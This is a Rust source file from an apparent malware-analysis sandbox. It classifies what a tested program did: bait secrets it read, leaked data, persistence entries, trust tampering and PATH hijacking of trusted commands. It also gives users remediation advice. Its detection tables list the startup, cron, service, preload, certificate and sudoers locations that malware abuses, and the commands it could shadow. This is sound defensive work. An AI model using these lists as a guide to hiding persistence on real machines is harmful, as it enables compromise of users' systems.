//! Turns raw observations into findings a non-specialist can read.

use crate::canary::Canary;
use crate::packages::Packages;
use crate::sandbox::{FsDiff, Outcome};
use crate::explore::{describe_short, Done, Verdict};
use crate::i18n::{t, tf};
use crate::trace::{Activity, Leak};
use crate::watch::{Op, Touches};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::path::Path;

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum Kind {
    /// Touched a bait secret.
    Secret,
    /// Made something run again later by itself.
    Persistence,
    /// Changed what the machine trusts (software sources, certificates, admin rights).
    Trust,
    /// Anything else it did to the home or the system.
    Other,
}

impl Kind {
    fn title(self) -> &'static str {
        match self {
            Kind::Secret => "Secrets it went after",
            Kind::Persistence => "Ways it will run again by itself",
            Kind::Trust => "What it now trusts",
            Kind::Other => "Everything else it changed",
        }
    }
    fn tag(self) -> &'static str {
        match self {
            Kind::Secret => "secret",
            Kind::Persistence => "persistence",
            Kind::Trust => "trust",
            Kind::Other => "other",
        }
    }
}

/// Where code goes to start again on its own. Prefixes; "~/" is the home.
const PERSISTENCE: &[(&str, &str)] = &[
    ("~/.bashrc", "runs in every new terminal"),
    ("~/.bash_profile", "runs at every login"),
    ("~/.profile", "runs at every login"),
    ("~/.zshrc", "runs in every new terminal"),
    ("~/.config/autostart/", "starts with the desktop session"),
    ("~/.config/systemd/user/", "user service"),
    (
        "~/.ssh/authorized_keys",
        "lets someone log in to this machine",
    ),
    ("~/.ssh/rc", "runs at every SSH login"),
    ("/etc/cron", "scheduled task"),
    ("/var/spool/cron/", "scheduled task"),
    ("/etc/systemd/system/", "system service"),
    ("/usr/lib/systemd/system/", "system service"),
    ("/lib/systemd/system/", "system service"),
    ("/etc/init.d/", "boot script"),
    ("/etc/rc.local", "boot script"),
    ("/etc/profile", "runs at every login"),
    ("/etc/bash.bashrc", "runs in every terminal"),
    ("/etc/xdg/autostart/", "starts with every desktop session"),
    ("/etc/ld.so.preload", "loaded into every program"),
    ("/etc/udev/rules.d/", "runs when a device is plugged in"),
];

const TRUST: &[(&str, &str)] = &[
    ("/etc/apt/sources.list", "adds a software source"),
    ("/etc/apt/trusted.gpg", "trusts a new signing key"),
    ("/etc/apt/keyrings/", "trusts a new signing key"),
    ("/usr/share/keyrings/", "trusts a new signing key"),
    ("/etc/yum.repos.d/", "adds a software source"),
    (
        "/usr/local/share/ca-certificates/",
        "trusts a new root certificate",
    ),
    ("/etc/ssl/certs/", "trusts a new root certificate"),
    ("/etc/sudoers", "changes who can be admin"),
    ("/etc/passwd", "changes the user accounts"),
    ("/etc/shadow", "changes the passwords"),
    ("/etc/hosts", "redirects web addresses"),
];

fn lookup(table: &[(&str, &'static str)], path: &str) -> Option<&'static str> {
    table
        .iter()
        .find(|(p, _)| path.starts_with(p))
        .map(|(_, why)| *why)
}

#[derive(Debug, PartialEq)]
pub struct Finding {
    pub kind: Kind,
    /// "~/.ssh/id_ed25519" or "/etc/crontab".
    pub path: String,
    /// "read", "added", ...
    pub did: Vec<&'static str>,
    pub why: String,
    /// The programs that did it (command lines), when the kernel tracer is running.
    pub by: Vec<String>,
    /// For a secret: its family in plain words ("crypto wallets"), else "".
    pub group: &'static str,
    /// How many files this line stands for: more than 1 when siblings were folded into their folder.
    pub count: usize,
    /// The package it belongs to, when the package manager installed it from a repository (packages.rs): not an alarm.
    pub package: String,
    /// What it put there, to show: lines added to a startup file, addresses of a software source.
    pub lines: Vec<String>,
}

fn changing(ops: &[Op]) -> bool {
    ops.iter()
        .any(|o| matches!(o, Op::Write | Op::Create | Op::Delete | Op::Move))
}

/// Created and deleted during the run (temporary files): whatever happened there is gone, so it is only counted.
fn transient_root(home: &Touches, rel: &Path) -> bool {
    home.ops
        .get(rel)
        .is_some_and(|o| o.contains(&Op::Create) && o.contains(&Op::Delete))
}

fn transient(home: &Touches, rel: &Path) -> bool {
    rel.ancestors()
        .any(|a| !a.as_os_str().is_empty() && transient_root(home, a))
}

/// How many temporary files or folders the run left no trace of (nested ones count once).
pub fn transient_count(home: &Touches) -> usize {
    home.ops
        .keys()
        .filter(|r| transient_root(home, r) && !r.parent().is_some_and(|p| transient(home, p)))
        .count()
}

pub fn findings(canaries: &[Canary], home: &Touches, sys: &FsDiff, pk: &Packages) -> Vec<Finding> {
    let mut out = Vec::new();
    for (rel, ops) in &home.ops {
        if transient(home, rel) {
            continue;
        }
        let rel_s = rel.to_string_lossy();
        let path = if rel_s.is_empty() {
            "~".to_string()
        } else {
            format!("~/{rel_s}")
        };
        let ops: Vec<Op> = ops.iter().copied().collect();
        let did = ops.iter().map(|o| o.word()).collect();
        // listing the very folder that holds a bait (~/.ssh), not any parent (~/.config is listed by everything)
        let bait_inside = canaries
            .iter()
            .find(|c| std::path::Path::new(&c.path).parent() == Some(rel.as_path()));
        let (kind, why, group) = if let Some(c) = canaries.iter().find(|c| c.path == rel_s) {
            (Kind::Secret, c.what.to_string(), c.group)
        } else if let (Some(c), true) = (bait_inside, ops.contains(&Op::List) && !rel_s.is_empty())
        {
            (Kind::Secret, format!("looked inside the folder of: {}", c.what), c.group)
        } else if let (Some(why), true) = (lookup(PERSISTENCE, &path), changing(&ops)) {
            (Kind::Persistence, why.to_string(), "")
        } else if changing(&ops) {
            (Kind::Other, String::new(), "")
        } else {
            continue; // reading ordinary files (a shell reading ~/.bashrc) is not news
        };
        out.push(Finding {
            kind,
            path,
            did,
            why,
            by: vec![],
            group,
            count: 1,
            package: String::new(),
            lines: vec![],
        });
    }
    for (list, word) in [
        (&sys.added, "added"),
        (&sys.changed, "changed"),
        (&sys.deleted, "deleted"),
    ] {
        for p in list {
            let (kind, why) = match (lookup(PERSISTENCE, p), lookup(TRUST, p)) {
                (Some(w), _) => (Kind::Persistence, w),
                (_, Some(w)) => (Kind::Trust, w),
                _ => (Kind::Other, ""),
            };
            // what a repository package brings (docker-ce's boot script, dbus's system user) is the package's own
            let package = pk.of(p).filter(|_| kind != Kind::Other && word != "deleted").unwrap_or("").to_string();
            out.push(Finding {
                kind: if package.is_empty() { kind } else { Kind::Other },
                path: p.clone(),
                did: vec![word],
                why: why.to_string(),
                by: vec![],
                group: "",
                count: 1,
                package,
                lines: pk.sources.get(p).cloned().unwrap_or_default(),
            });
        }
    }
    standard_certificates(&mut out, sys);
    out.sort_by(|a, b| (a.kind, &a.path).cmp(&(b.kind, &b.path)));
    fold(out)
}

const CERTS: &str = "/etc/ssl/certs/";
const MOZILLA: &str = "/usr/share/ca-certificates/mozilla/";

/// Installing the `ca-certificates` package (pulled in by curl, git, pip…) writes the standard Mozilla roots and links
/// each one into /etc/ssl/certs. Those links are not a new trust: they are classed as ordinary when the Mozilla files
/// came in the same run, one link per root at most. A certificate that matches no Mozilla file, or any certificate
/// dropped in /usr/local/share/ca-certificates (where a custom root goes), stays an alarm.
fn standard_certificates(out: &mut [Finding], sys: &FsDiff) {
    let roots: std::collections::BTreeSet<&str> = sys
        .added
        .iter()
        .filter_map(|p| p.strip_prefix(MOZILLA)?.strip_suffix(".crt"))
        .collect();
    if roots.is_empty() || sys.added.iter().any(|p| p.starts_with("/usr/local/share/ca-certificates/") && p.len() > 33) {
        return;
    }
    let hashes = out.iter().filter(|f| f.path.starts_with(CERTS) && f.path.ends_with(".0")).count();
    for f in out.iter_mut().filter(|f| f.kind == Kind::Trust && f.path.starts_with(CERTS)) {
        let name = &f.path[CERTS.len()..];
        let standard = name == "ca-certificates.crt"
            || name.strip_suffix(".pem").is_some_and(|n| roots.contains(n))
            || (name.ends_with(".0") && hashes <= roots.len());
        if standard {
            f.kind = Kind::Other;
            f.why = "standard root certificates (ca-certificates package)".into();
        }
    }
}

/// Ordinary changes printed in the terminal before "and N more".
const OTHER_LINES: usize = 15;

/// More than FOLD lines of the same kind in one folder become one line for that folder (report.json keeps the count).
const FOLD: usize = 5;

fn fold(list: Vec<Finding>) -> Vec<Finding> {
    let parent = |p: &str| p.rfind('/').map(|i| p[..=i].to_string()).unwrap_or_default();
    type Key = (Kind, String, Vec<&'static str>, String, &'static str, String);
    let mut groups: BTreeMap<Key, Vec<Finding>> = BTreeMap::new();
    for f in list {
        groups.entry((f.kind, parent(&f.path), f.did.clone(), f.why.clone(), f.group, f.package.clone())).or_default().push(f);
    }
    let mut out = Vec::new();
    for ((kind, dir, did, why, group, package), fs) in groups {
        if fs.len() > FOLD && kind != Kind::Secret {
            let mut by: Vec<String> = fs.iter().flat_map(|f| f.by.iter().cloned()).collect();
            by.sort();
            by.dedup();
            out.push(Finding { kind, path: dir, did, why, by, group, count: fs.len(), package, lines: vec![] });
        } else {
            out.extend(fs);
        }
    }
    // what no package explains comes first among ordinary changes: it is what the program itself left
    out.sort_by(|a, b| (a.kind, !a.package.is_empty(), &a.path).cmp(&(b.kind, !b.package.is_empty(), &b.path)));
    out
}

/// What to do about each family of secrets if the program already ran on a real machine.
fn advice(group: &str) -> &'static str {
    use crate::canary::*;
    match group {
        PASSWORDS => "change the passwords saved in your browsers and password manager, and log out of every site",
        WALLETS => "move your crypto to a new wallet: the old one's seed and keys must be considered stolen",
        DEV => "revoke those tokens and keys, then create new ones (cloud, GitHub, npm, PyPI, databases)",
        CHAT => "log out of every session in those apps (Telegram, Discord, Slack) from another device",
        _ => "replace your SSH and GPG keys, and remove the old public keys wherever they are trusted",
    }
}

/// The report's first lines, for anyone: computed from the measured findings, never from the model.
fn unbase64(s: &str) -> Vec<u8> {
    let val = |c: u8| match c {
        b'A'..=b'Z' => Some(c - b'A'),
        b'a'..=b'z' => Some(c - b'a' + 26),
        b'0'..=b'9' => Some(c - b'0' + 52),
        b'+' | b'-' => Some(62),
        b'/' | b'_' => Some(63),
        _ => None,
    };
    let v: Vec<u8> = s.bytes().filter_map(val).collect();
    v.chunks(4)
        .flat_map(|c| {
            let n = c.iter().enumerate().fold(0u32, |n, (i, &x)| n | (x as u32) << (18 - 6 * i));
            (0..c.len().saturating_sub(1)).map(move |i| (n >> (16 - 8 * i)) as u8)
        })
        .collect()
}

/// Which bait a leak carried: its mark in the excerpt as is, in upper case, or inside a base64 run (decoded at each
/// of the four offsets a run can start on). None: some bait data left, which one is not readable.
pub fn leaked<'c>(canaries: &'c [Canary], l: &Leak) -> Option<&'c Canary> {
    let up = l.excerpt.to_uppercase();
    if let Some(c) = canaries.iter().find(|c| l.excerpt.contains(&c.mark) || up.contains(&c.mark.to_uppercase())) {
        return Some(c);
    }
    let runs = l.excerpt.split(|ch: char| !(ch.is_ascii_alphanumeric() || "+/-_".contains(ch)));
    for run in runs.filter(|r| r.len() >= 16) {
        for off in 0..4 {
            let text = String::from_utf8_lossy(&unbase64(&run[off.min(run.len())..])).to_lowercase();
            if let Some(c) = canaries.iter().find(|c| text.contains(&c.mark)) {
                return Some(c);
            }
        }
    }
    None
}

fn kb(n: u64) -> String {
    if n < 1024 {
        tf("{} bytes", &[&n.to_string()])
    } else if n < 1 << 20 {
        tf("{} KB", &[&format!("{:.1}", n as f64 / 1024.0)])
    } else {
        tf("{} MB", &[&format!("{:.1}", n as f64 / 1048576.0)])
    }
}

/// Why the run ended early, as a line for "In short": what came next was not seen. None when it ended normally.
pub fn failure(o: &Outcome) -> Option<String> {
    if o.timed_out {
        return Some(t("It was stopped at the time limit: what it would have done next was not seen."));
    }
    let code = o.exit.filter(|c| *c != 0)?;
    let mut s = tf("It stopped on an error (exit {}): what it would have done next was not seen.", &[&code.to_string()]);
    // its own last words usually say why ("requires zstd"): the last non-empty line, terminal colours removed
    let last = [&o.stderr, &o.stdout].iter().find_map(|b| {
        let text = String::from_utf8_lossy(b);
        text.lines().map(plain).map(|l| l.trim().to_string()).rfind(|l| !l.is_empty())
    });
    if let Some(l) = last {
        let l: String = l.chars().take(160).collect();
        s += &format!(" {}", tf("Its last message: {}", &[&l]));
    }
    Some(s)
}

/// A line without its terminal escape sequences (colours, "ESC(B").
fn plain(l: &str) -> String {
    let mut out = String::new();
    let mut esc = false;
    for c in l.chars() {
        if c == '\x1b' {
            esc = true;
        } else if esc {
            esc = !c.is_ascii_alphabetic();
        } else if !c.is_control() {
            out.push(c);
        }
    }
    out
}

/// Where packages keep their signing keys: added together with a software source, which names it better.
const KEYS: &[&str] = &["/etc/apt/keyrings/", "/usr/share/keyrings/", "/etc/apt/trusted.gpg"];

pub fn in_short(findings: &[Finding], activity: Option<&Activity>, canaries: &[Canary], failure: Option<&str>) -> String {
    let secrets: Vec<&Finding> = findings.iter().filter(|f| f.kind == Kind::Secret).collect();
    let persist = findings.iter().filter(|f| f.kind == Kind::Persistence).count();
    let trust = findings.iter().filter(|f| f.kind == Kind::Trust).count();
    let mut groups: Vec<&str> = secrets.iter().map(|f| f.group).filter(|g| !g.is_empty()).collect();
    groups.sort();
    groups.dedup();
    let mut s = format!("\n{}\n", t("In short"));
    let probed = activity.is_some_and(|a| !a.blocked.is_empty());
    let leaks = activity.map(|a| a.leaks.as_slice()).unwrap_or(&[]);
    let mut proofs: Vec<(String, String)> = Vec::new();
    for l in leaks {
        let what = leaked(canaries, l).map(|c| tf("your {}", &[&t(c.what)])).unwrap_or_else(|| t("one of your secrets"));
        let dest = l.name.clone().unwrap_or_else(|| l.ip.clone());
        if !proofs.contains(&(what.clone(), dest.clone())) {
            proofs.push((what, dest));
        }
    }
    for (what, dest) in proofs.iter().take(5) {
        s += &format!("   !! {}\n", tf("PROOF: a secret left the machine, sent to {}: {}.", &[dest, what]));
    }
    if let Some(f) = failure {
        s += &format!("   !  {f}\n");
    }
    if secrets.is_empty() && persist == 0 && trust == 0 && !probed && leaks.is_empty() {
        s += &format!("   {}\n", t("Nothing alarming: no secret touched, nothing set to run again, nothing new trusted."));
    }
    if !secrets.is_empty() {
        let fams: Vec<String> = groups.iter().map(|g| t(g)).collect();
        let tpl = if secrets.len() > 1 { "It went through your {}: {} bait files." } else { "It went through your {}: {} bait file." };
        s += &format!("   !! {}\n", tf(tpl, &[&fams.join(", "), &secrets.len().to_string()]));
    }
    if persist > 0 {
        let tpl = if persist > 1 { "It set itself up to run again on its own ({} ways)." } else { "It set itself up to run again on its own ({} way)." };
        s += &format!("   !! {}\n", tf(tpl, &[&persist.to_string()]));
    }
    let sources: Vec<&String> = findings.iter().filter(|f| f.kind == Kind::Trust && f.path.starts_with("/etc/apt/sources.list.d/")).flat_map(|f| &f.lines).collect();
    if !sources.is_empty() {
        let list: Vec<&str> = sources.iter().take(3).map(|u| u.as_str()).collect();
        s += &format!("   !! {}\n", tf("It added a software source: {}. What comes from there will be installed like the system's own updates.", &[&list.join(", ")]));
    }
    let other_trust = findings.iter().filter(|f| f.kind == Kind::Trust).any(|f| {
        let source = f.path.starts_with("/etc/apt/sources.list.d/") && !f.lines.is_empty();
        let key = !sources.is_empty() && KEYS.iter().any(|k| f.path.starts_with(k));
        !source && !key
    });
    if trust > 0 && other_trust {
        s += &format!("   !! {}\n", t("It changed what the machine trusts (software sources, certificates, admin rights or accounts)."));
    }
    let mut boot: Vec<&str> = findings
        .iter()
        .filter(|f| !f.package.is_empty() && lookup(PERSISTENCE, &f.path).is_some())
        .flat_map(|f| f.package.split(", "))
        .collect();
    boot.sort();
    boot.dedup();
    if !boot.is_empty() {
        let list = if boot.len() > 6 { format!("{}…", boot[..6].join(", ")) } else { boot.join(", ") };
        s += &format!("   {}\n", tf("Packages it installed will start with the machine: {} (normal for this kind of software).", &[&list]));
    }
    let path: Vec<&Finding> = findings.iter().filter(|f| f.why.starts_with(PATH_ONLY)).collect();
    if !path.is_empty() {
        let mut dirs: Vec<&str> = path.iter().map(|f| &f.why[PATH_ONLY.len()..]).collect();
        dirs.dedup();
        let files: Vec<&str> = path.iter().map(|f| f.path.as_str()).collect();
        s += &format!("   {}\n", tf("It adds {} to your PATH (in {}): normal for an installer of commands.", &[&dirs.join(", "), &files.join(", ")]));
    }
    let own: Vec<&str> = findings.iter().filter(|f| f.why.contains(", read by its own tool: ")).map(|f| f.path.as_str()).collect();
    if !own.is_empty() {
        let tpl = if own.len() > 1 { "It read some of its own settings ({}): normal, nothing else touched them." } else { "It read one of its own settings ({}): normal, nothing else touched it." };
        s += &format!("   {}\n", tf(tpl, &[&own.join(", ")]));
    }
    if findings.iter().any(|f| ["/var/lib/dpkg/", "/var/lib/rpm/", "/usr/lib/sysimage/rpm/"].iter().any(|p| f.path.starts_with(p))) {
        s += &format!("   {}\n", t("It installed software with the system's package manager (normal for an installer)."));
    }
    if let Some(a) = activity.filter(|a| !a.blocked.is_empty()) {
        let mut tries: Vec<String> = a.blocked.iter().map(|b| format!("{}:{}", b.ip, b.port)).collect();
        tries.dedup();
        let tpl = if a.blocked.len() > 1 { "It tried to reach your local network {} times (router, other machines): chouf refused. {}" } else { "It tried to reach your local network {} time (router, other machines): chouf refused. {}" };
        s += &format!("   !! {}\n", tf(tpl, &[&a.blocked.len().to_string(), &tries.iter().take(4).cloned().collect::<Vec<_>>().join(", ")]));
    }
    // read secrets, then sent data out: the content may be encrypted (HTTPS), the sequence still says something
    if let (Some(a), false, true) = (activity, leaks.is_empty() == false, !secrets.is_empty()) {
        // only what it sent after its first look at a bait (an apt download before it is not "after")
        // shortcut: a connection opened before the read and reused after it is not counted; the leak proof still sees it
        let first = a.opens.iter().filter(|o| canaries.iter().any(|c| o.path == format!("/root/{}", c.path))).map(|o| o.t).min();
        let mut out: Vec<(String, u64)> = Vec::new();
        for c in a.conns.iter().filter(|c| c.sent > 0 && first.is_none_or(|f| c.t >= f)) {
            let dest = c.name.clone().unwrap_or_else(|| c.ip.clone());
            match out.iter_mut().find(|(d, _)| *d == dest) {
                Some(x) => x.1 += c.sent,
                None => out.push((dest, c.sent)),
            }
        }
        if !out.is_empty() {
            let list: Vec<String> = out.iter().take(3).map(|(d, n)| tf("{} to {}", &[&kb(*n), d])).collect();
            s += &format!("   !! {}\n", tf("After reading your secrets it sent {}.", &[&list.join(", ")]));
        }
    }
    if let Some(a) = activity {
        let mut places: Vec<String> = a.conns.iter().map(|c| c.name.clone().unwrap_or_else(|| c.ip.clone())).collect();
        places.sort();
        places.dedup();
        match places.len() {
            0 => s += &format!("   {}\n", t("It contacted nothing on the network.")),
            n => {
                let tpl = if n > 1 { "It contacted {} places on the network: {}." } else { "It contacted {} place on the network: {}." };
                s += &format!("   {}\n", tf(tpl, &[&n.to_string(), &places.iter().take(5).cloned().collect::<Vec<_>>().join(", ")]));
            }
        }
    }
    if !groups.is_empty() || persist > 0 {
        s += &format!("   {}\n", t("If you already ran it on your own machine:"));
        for g in &groups {
            s += &format!("     - {}\n", t(advice(g)));
        }
        // a startup file it added lines to is the user's own: take the lines out, never the file
        let (edited, placed): (Vec<&Finding>, Vec<&Finding>) =
            findings.iter().filter(|f| f.kind == Kind::Persistence).partition(|f| f.path.starts_with("~/") && !f.lines.is_empty());
        if !placed.is_empty() {
            let where_: Vec<&str> = placed.iter().map(|f| f.path.as_str()).take(6).collect();
            s += &format!("     - {}\n", tf("remove what it set up to come back: {}", &[&where_.join(", ")]));
        }
        if !edited.is_empty() {
            let where_: Vec<&str> = edited.iter().map(|f| f.path.as_str()).collect();
            s += &format!("     - {}\n", tf("take out the lines it added to {} (shown below)", &[&where_.join(", ")]));
        }
    }
    s
}

/// Names the programs behind each finding: "~/x" is /root/x inside the sandbox, system paths are themselves.
/// The shells persist.rs starts (a new terminal, a login): what they run from a startup file is the program's doing.
const CHOUF_SHELLS: &[&str] = &["bash -i -c true", "bash -l -c true"];

/// Also clears a bait read only by its own tools (npm reading ~/.npmrc): it becomes an ordinary line that says so.
/// The kernel tracer is what makes this possible; without it, every bait read stays an alarm.
/// `sys` is what the run changed on the system: a reader whose program file was added or changed during the run (a
/// fake `npm` dropped by the program under test) is never excused, nor one named without a path.
pub fn attribute(findings: &mut [Finding], a: &Activity, sys: &FsDiff) {
    let planted = |path: &str| sys.added.iter().chain(&sys.changed).any(|p| p == path);
    for f in findings.iter_mut() {
        let inside = match f.path.strip_prefix('~') {
            Some(rest) => format!("/root{rest}"),
            None => f.path.clone(),
        };
        // the shells chouf opens to set off a startup file read that file by design: they are not the program
        f.by = a.openers(&inside).0.into_iter().filter(|w| !CHOUF_SHELLS.contains(&w.as_str())).collect();
        let Some(rel) = f.path.strip_prefix("~/") else { continue };
        if f.kind != Kind::Secret || f.why.starts_with("looked inside") {
            continue;
        }
        let tools = crate::canary::own_tools(rel);
        let readers = a.opener_commands(&inside);
        let own = |cmd: &Option<Vec<String>>| {
            cmd.as_ref().and_then(|c| {
                // c = [file run, argv...]: the program itself, or the script handed to an interpreter
                // (python3 /usr/local/bin/pip). It must be a file that was there before the run, as was the interpreter.
                if planted(&c[0]) {
                    return None;
                }
                c.iter()
                    .take(3)
                    .filter(|x| x.starts_with('/') && !planted(x))
                    .filter_map(|x| x.rsplit('/').next())
                    .find(|n| tools.contains(n))
                    .map(str::to_string)
            })
        };
        if tools.is_empty() || readers.is_empty() || !readers.iter().all(|r| own(r).is_some()) {
            continue;
        }
        let mut names: Vec<String> = readers.iter().filter_map(own).collect();
        names.sort();
        names.dedup();
        f.kind = Kind::Other;
        f.why = format!("{}, read by its own tool: {}", f.why, names.join(", "));
        f.group = "";
    }
}

/// The why of a startup line that only puts folders in PATH, followed by the folders.
pub const PATH_ONLY: &str = "adds to PATH: ";

/// Startup files chouf planted: what the program added to them is shown, line by line.
const STARTUP: &[&str] = &[".bashrc", ".profile", ".bash_profile", ".zshrc"];

/// Commands a folder put first in PATH must not take over: they would run the program's code instead.
/// shortcut: a fixed list, not the machine's own commands; extend it when a real case slips through.
const SENSITIVE: &[&str] = &[
    "sudo", "su", "doas", "pkexec", "ssh", "scp", "sftp", "ssh-add", "ssh-agent", "gpg", "passwd", "login", "git", "ls",
    "cat", "cp", "mv", "rm", "sh", "bash", "zsh", "dash", "env", "ps", "kill", "id", "whoami", "curl", "wget", "python",
    "python3", "node", "npm", "npx", "pip", "pip3", "apt", "apt-get", "dpkg", "dnf", "yum", "systemctl", "crontab",
    "docker", "podman", "mount", "ip", "ss", "chmod", "chown", "grep", "find", "tar", "openssl", "which", "less", "vi",
    "vim", "nano", "keepassxc", "firefox", "chromium", "google-chrome", "brave-browser",
];

/// A small regular file of the fake home, or None: never follows a link out of it, never blocks on a pipe the
/// program left in place of a file.
pub fn small_file(path: &Path) -> Option<String> {
    let m = std::fs::symlink_metadata(path).ok()?;
    (m.is_file() && m.len() <= 65536).then(|| std::fs::read_to_string(path).ok()).flatten()
}

/// "$HOME/.cargo/bin", "${HOME}/x" or "~/x" → the path below the home, if it stays inside it.
fn home_rel(p: &str) -> Option<String> {
    let r = p.strip_prefix("$HOME/").or(p.strip_prefix("${HOME}/")).or(p.strip_prefix("~/"))?;
    let r = r.trim_end_matches('/');
    (!r.is_empty() && !r.split('/').any(|c| c == ".." || c.is_empty()) && !r.contains(['$', '`', '\\'])).then(|| r.to_string())
}

/// `export PATH="$HOME/.cargo/bin:$PATH"` → the home folders it adds; None for anything more than that.
fn path_dirs(line: &str) -> Option<Vec<String>> {
    let v = line.strip_prefix("export ").unwrap_or(line).strip_prefix("PATH=")?;
    let v = v.strip_prefix('"').and_then(|v| v.strip_suffix('"')).unwrap_or(v);
    if v.contains(['`', ';', '&', '|', '<', '>', '"', '\'', ' ', '(']) {
        return None;
    }
    let mut dirs = Vec::new();
    for part in v.split(':') {
        if !["$PATH", "${PATH}", ""].contains(&part) {
            dirs.push(home_rel(part)?);
        }
    }
    Some(dirs)
}

/// `. "$HOME/.cargo/env"` or `source ~/.x/env` → the home file it reads.
fn sourced(line: &str) -> Option<String> {
    let rest = line.strip_prefix(". ").or(line.strip_prefix("source "))?.trim();
    let rest = rest.strip_prefix('"').and_then(|r| r.strip_suffix('"')).unwrap_or(rest);
    if rest.contains([' ', '"', '\'', ';', '&', '|']) {
        return None;
    }
    home_rel(rest)
}

/// A file like rustup's ~/.cargo/env: nothing but folders put in PATH, with the usual "already there?" test.
fn env_file_dirs(text: &str) -> Option<Vec<String>> {
    let mut dirs = Vec::new();
    for l in text.lines().map(str::trim) {
        let pattern = l.ends_with(')') && !l.contains('(') && l.chars().all(|c| c.is_ascii_alphanumeric() || "*:\"$/._-{}~)".contains(c));
        if l.is_empty() || l.starts_with('#') || [";;", "esac", "export PATH", "case \":${PATH}:\" in", "case \":$PATH:\" in"].contains(&l) || pattern {
            continue;
        }
        dirs.extend(path_dirs(l)?);
    }
    Some(dirs)
}

/// Shows what the program added to the startup files chouf planted. Lines that only put home folders in PATH (a
/// language installer: rustup's `. "$HOME/.cargo/env"`) are not a way back but ordinary, as long as those folders
/// take over none of the commands people trust (a `sudo` placed first in PATH would be).
pub fn startup_lines(findings: &mut [Finding], home: &Path) {
    for f in findings.iter_mut().filter(|f| f.kind == Kind::Persistence) {
        let Some(rel) = f.path.strip_prefix("~/").filter(|r| STARTUP.contains(r)) else { continue };
        let Some(now) = small_file(&home.join(rel)) else { continue };
        let before: Vec<&str> = crate::canary::planted(rel).unwrap_or("").lines().collect();
        f.lines = now.lines().filter(|l| !l.trim().is_empty() && !before.contains(l)).map(String::from).collect();
        let mut dirs = Vec::new();
        let only_path = !f.lines.is_empty()
            && f.lines.iter().map(|l| l.trim()).all(|l| {
                let more = path_dirs(l).or_else(|| sourced(l).and_then(|file| small_file(&home.join(file))).and_then(|t| env_file_dirs(&t)));
                let ok = l.starts_with('#') || more.is_some();
                dirs.extend(more.unwrap_or_default());
                ok
            });
        if !only_path || dirs.is_empty() {
            continue;
        }
        dirs.sort();
        dirs.dedup();
        let mut taken: Vec<String> = dirs
            .iter()
            .filter(|d| std::fs::symlink_metadata(home.join(d)).is_ok_and(|m| m.is_dir()))
            .flat_map(|d| std::fs::read_dir(home.join(d)).into_iter().flatten().flatten())
            .map(|e| e.file_name().to_string_lossy().into_owned())
            .filter(|n| SENSITIVE.contains(&n.as_str()))
            .collect();
        taken.sort();
        taken.dedup();
        if taken.is_empty() {
            f.kind = Kind::Other;
            f.why = format!("{PATH_ONLY}{}", dirs.iter().map(|d| format!("~/{d}")).collect::<Vec<_>>().join(", "));
        } else {
            f.why = format!("{}{}", TAKES_OVER, taken.join(", "));
        }
    }
}

/// The why of a startup line whose PATH folder takes over trusted commands, followed by them.
pub const TAKES_OVER: &str = "puts its own commands first in PATH, in place of: ";

/// Drops what reached the fake home from the host, not from the sandbox: the machine's file indexer (updatedb), a
/// backup (rsync) or a search tool walking ~/.local/share sets off the same file events as the program would. With
/// the tracer running and nothing lost, every open made inside the sandbox is seen, folders included: a bait touched
/// with no opener inside was touched from outside. Returns how many findings were dropped.
pub fn from_outside(findings: &mut Vec<Finding>, a: &Activity) -> usize {
    if a.lost {
        return 0;
    }
    let before = findings.len();
    findings.retain(|f| !(f.kind == Kind::Secret && f.path.starts_with('~') && f.by.is_empty()));
    before - findings.len()
}

/// How a shell would need the argument written: what the report shows must be what ran.
fn quote(a: &str) -> String {
    let plain = !a.is_empty()
        && a.bytes()
            .all(|b| b.is_ascii_alphanumeric() || b"_-./:=@%+,".contains(&b));
    if plain {
        a.to_string()
    } else {
        format!("'{}'", a.replace('\'', r"'\''"))
    }
}

/// The package managers whose inner workings (methods, dpkg, install scripts) only bury what the program itself ran.
const PACKAGE_MANAGERS: &[&str] = &["apt-get", "apt", "aptitude", "dpkg", "dnf", "yum", "rpm"];

/// The program tree with what runs under a package manager folded into it, counted (report.json keeps it all).
fn fold_package_managers(tree: &[(usize, String, Option<i64>)]) -> Vec<(usize, String, Option<i64>, usize)> {
    let mut out: Vec<(usize, String, Option<i64>, usize)> = Vec::new();
    let mut under: Option<usize> = None;
    for (depth, cmd, exit) in tree {
        if let Some(d) = under {
            if *depth > d {
                if let Some(last) = out.last_mut() {
                    last.3 += 1;
                }
                continue;
            }
            under = None;
        }
        let program = cmd.split_whitespace().next().unwrap_or("").rsplit('/').next().unwrap_or("");
        if PACKAGE_MANAGERS.contains(&program) {
            under = Some(*depth);
        }
        out.push((*depth, cmd.clone(), *exit, 0));
    }
    out
}

/// What the explorer did and what it concluded: an opinion, printed next to the measured findings.
pub struct Exploration<'a> {
    pub steps: &'a [Done],
    pub verdict: Result<Verdict, String>,
    pub model: String,
    pub note: Option<String>,
}

pub struct Report<'a> {
    pub id: &'a str,
    pub image: &'a str,
    pub cmd: &'a [String],
    pub outcome: &'a Outcome,
    pub findings: Vec<Finding>,
    pub incomplete: bool,
    pub transient: usize,
    /// What the kernel tracer saw, or why there is nothing.
    pub activity: Result<&'a Activity, String>,
    pub canaries: &'a [Canary],
    pub exploration: Option<Exploration<'a>>,
    /// What the program set up to come back, set off once by chouf (persist.rs).
    pub triggered: &'a [Done],
    /// Bait touches that came from the host, not the sandbox (from_outside), left out.
    pub outside: usize,
}

impl Report<'_> {
    pub fn json(&self) -> Value {
        let o = self.outcome;
        json!({
            "session": self.id, "image": self.image, "command": self.cmd,
            "exit_code": o.exit, "timed_out": o.timed_out, "seconds": o.elapsed.as_secs_f64(),
            "watch_incomplete": self.incomplete, "temporary_files": self.transient, "touched_from_outside": self.outside,
            "findings": self.findings.iter().map(|f| json!({"kind": f.kind.tag(), "path": f.path, "did": f.did, "why": f.why, "by": f.by, "group": f.group, "count": f.count, "package": f.package, "lines": f.lines})).collect::<Vec<_>>(),
            "activity": match &self.activity {
                Ok(a) => {
                    let mut v = a.json();
                    // name the bait each leak carried (the activity alone does not know the baits)
                    for (i, l) in a.leaks.iter().enumerate() {
                        v["leaks"][i]["what"] = leaked(self.canaries, l).map(|c| c.what).into();
                    }
                    v
                }
                Err(why) => json!({"unavailable": why}),
            },
            "triggered": self.triggered.iter().map(|d| json!({"did": describe_short(d), "exit": d.exit, "timed_out": d.timed_out})).collect::<Vec<_>>(),
            "exploration": self.exploration.as_ref().map(|x| json!({
                "model": x.model, "note": x.note,
